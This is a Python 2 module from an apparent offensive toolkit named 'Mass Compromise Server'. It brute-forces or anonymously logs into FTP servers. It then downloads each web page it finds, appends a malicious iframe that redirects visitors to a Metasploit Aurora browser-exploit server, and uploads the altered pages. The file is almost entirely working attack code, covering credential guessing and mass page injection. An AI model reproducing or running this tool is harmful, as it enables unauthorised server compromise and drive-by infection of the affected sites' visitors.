# coding: utf-8
# Copyright (c) 2015-2016 Free Security Team
# 
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.
#
import os
import ftplib
import optparse, time
from time import *
from colored import *
print '%s Loading Server Executioner Module%s' % (fg(3), attr(0))
sleep(4)
print "\n\tMass Compromise Server [\033[1;31mserver/ftpserver\033[1;m] |  * exploit vuln FTP\n\t server and brute attempt anonymous logon and add malicious\n\t payload inject to target web pages. Enumerate password\n\t guest/guest. Download/inject every page base directory. Uses\n\t metasploit \'aurora browser exploit.\'\n"
print "\tUsage: use [modules]\n\t[RHOST] - specify remote host.\n\t[RPAGE] - malicious script file.\n\t[PASSL] - specify password list directory.\n\n\t[USER] - default username for ftp.\n\t[HOST] - target host password.\n "  
print "\tExploit Use : exploit/windows/browser/ms10_002_aurora\n\tInformation : Use the Metasploit Framework in order to quickly\n\t create malicious server hosted at http://youripaddress:8080/exploit\n"	
print "\tSample Redirection Page:\n\t\033[1;31m<iframe src=\"http://127.0.0.1:8080/exploit\"></iframe>\033[1;m\n"
try:
	def anonLogin(hostname):
		try:
			ftp = ftplib.FTP(hostname)
			ftp.login(username, password)
			print '\n[*] ' + str(hostname) \
			+ ' FTP Anonymous Logon Succeeded.'
			ftp.quit()
			return True
		except Exception, e:
			print '\n[-] ' + str(hostname) +\
				' FTP Anonymous Logon Failed.'
			return False
	def bruteLogin(hostname, passwdFile):
		pF = open(passwdFile, 'r')
		for line in pF.readlines():
			sleep(1)
			userName = line.split(':')[0]
			passWord = line.split(':')[1].strip('\r').strip('\n')
			print '[+] Trying: ' + userName + '/' + passWord
			try:
				ftp = ftplib.FTP(hostname)
				ftp.login(userName, passWord)
				print '\n[*] ' + str(hostname) +\
					' FTP Logon Succeeded: '+userName+'/'+passWord
				ftp.quit()
				return (userName, passWord)
			except Exception, e:
				pass
		print '\n[-] Could not brute force FTP credentials.'
		return (None, None)
	def returnDefault(ftp):
		try:
			dirList = ftp.nlst()
		except:
			dirList = []
			print '[-] Could not list directory contents.'
			print '[-] Skipping To Next Target.'
			return
		retList = []
		for fileName in dirList:
			fn = fileName.lower()
			if '.php' in fn or '.htm' in fn or '.asp' in fn or '.html' in fn:
				print '[+] Found default page: ' + fileName
			retList.append(fileName)
		return retList
	def injectPage(ftp, page, redirect):
		f = open(page + '.tmp', 'w')
		ftp.retrlines('RETR ' + page, f.write)
		print '[+] Downloaded Page: ' + page
		f.write(redirect)
		f.close()
		print '[+] Injected Malicious IFrame on: ' + page						#injections of mal page
		ftp.storlines('STOR ' + page, open(page + '.tmp'))
		print '[+] Uploaded Injected Page: ' + page
	def attack(username, password, tgtHost, redirect):							#calls username, password etc
		ftp = ftplib.FTP(tgtHost)
		ftp.login(username, password)
		defPages = returnDefault(ftp)
		for defPage in defPages:
			injectPage(ftp, defPage, redirect)
	def main():
		tgtHosts = str(raw_input('%s[CMD-LINE]:[RHOST]: %s' % (fg(1), attr(0))))			#input
		print (fore.LIGHT_BLUE+'RHOST:['+style.RESET+tgtHosts+fore.LIGHT_BLUE+']'+style.RESET)
		sleep(2)																		
		passwdFile = str(raw_input('%s[CMD-LINE]:[PASSL]: %s' % (fg(1), attr(0))))			#input
		print (fore.LIGHT_BLUE+"PASSL:["+style.RESET+passwdFile+fore.LIGHT_BLUE+']'+style.RESET)
		sleep(2)
		redirect = str(raw_input('%s[CMD-LINE]:[RPAGE]: %s' % (fg(1), attr(0))))			#input
		print (fore.LIGHT_BLUE+'RPAGE:['+style.RESET+redirect+fore.LIGHT_BLUE+']\n'+style.RESET)
		sleep(2)
		
		os.system('sudo service apache2 start')
		print '[+] Apache Web Server running' 
		print '[+] Starting exploit on '+tgtHosts+' using '+redirect

		tgtHosts = str(tgtHosts).split(', ')
		passwdFile = passwdFile
		redirect = redirect
		if tgtHosts == None or redirect == None:
			print parser.usage
			exit(0)
		for tgtHost in tgtHosts:
			username = None
			password = None
			if anonLogin(tgtHost) == True:
				username = str(raw_input(fore.YELLOW+'\n[CMD-LINE]:[USER]:  '+style.RESET))#anonymous, admin, administrator
				password = str(raw_input(fore.YELLOW+'[CMD-LINE]:[HOST]: '+style.RESET)) #host@your.com
				print '[+] Using Anonymous Creds to attack'
				attack(username, password, tgtHost, redirect)
			elif passwdFile != None:
				(username, password) =\
				bruteLogin(tgtHost, passwdFile)
			if password != None:
				print'[+] Using Credentials: ' +\
				username + '/' + password + ' to attack'
				attack(username, password, tgtHost, redirect)
	if __name__ == '__main__':
		main()
except KeyboardInterrupt:
	os.system('sudo service apache2 stop')
	print (fore.BLUE+"\n\n[+] Interrupted by user. Terminating. \n"+style.RESET)
	sleep(2)
except Exception, error: #handle exceptions
		#log(error)
		print "[-] Error Found: "+ str(error)+"\n"
		sleep(2)
